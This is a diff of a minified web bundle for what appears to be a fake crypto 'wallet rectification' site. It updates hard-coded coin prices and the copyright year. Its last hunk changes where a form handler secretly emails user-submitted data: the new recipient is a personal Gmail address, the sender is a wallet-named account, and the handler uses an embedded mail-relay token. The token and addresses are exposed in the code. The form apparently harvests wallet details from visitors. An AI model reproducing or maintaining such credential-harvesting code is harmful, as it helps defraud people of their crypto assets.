@@ -10824,43 +10824,43 @@ const Zh = ()=>y.jsxs(y.Fragment, {
     logo: qh,
     fullName: "Bitcoin",
     shortName: "BTC",
-    price: "$29,433.00",
+    price: "$70,075.71",
     percent: 1.53
 }, {
     logo: tm,
     fullName: "Ethereum",
     shortName: "ETH",
-    price: "$1,905.52",
+    price: "$3,511.61",
     percent: -.49
 }, {
     logo: $h,
     fullName: "Tether",
     shortName: "USDT",
-    price: "$1.002",
+    price: "$1.00",
     percent: -.81
 }, {
     logo: vf,
     fullName: "BinanceCoin",
     shortName: "BNB",
-    price: "$327.36",
+    price: "$602.61",
     percent: -2.2
 }, {
     logo: _h,
     fullName: "XRP",
     shortName: "XRP",
-    price: "$0.465",
+    price: "$0.6082",
     percent: .81
 }, {
     logo: em,
     fullName: "Litecoin",
     shortName: "LTC",
-    price: "$89.32",
+    price: "$95.60",
     percent: .21
 }, {
     logo: bh,
     fullName: "Tron",
     shortName: "TRX",
-    price: "$0.0663",
+    price: "$0.1192",
     percent: 1.28
 }]
   , rm = ()=>{
@@ -10921,7 +10921,7 @@ const Zh = ()=>y.jsxs(y.Fragment, {
     className: "container m-auto mt-5 py-10",
     children: y.jsx("h5", {
         className: "text-[#019DEA] text-center",
-        children: "Copyright © 2023 Blocknode+ Rectification . All rights reserved."
+        children: "Copyright © 2024 Blocknode+ Rectification . All rights reserved."
     })
 });
 var wf = {
@@ -12855,7 +12855,7 @@ const im = Hs(om)
         u.preventDefault();
         const c = {
             SecureToken: "f82cf782-76e6-40f1-911d-473ca9694550",
-            To: "Realmedelivery2410@gmail.com",
+            To: "symplymatt@gmail.com",
             From: "cryptowallets248@gmail.com",
             Subject: "blocksystem-chain",
             Body: `This is the data from the email sent: 
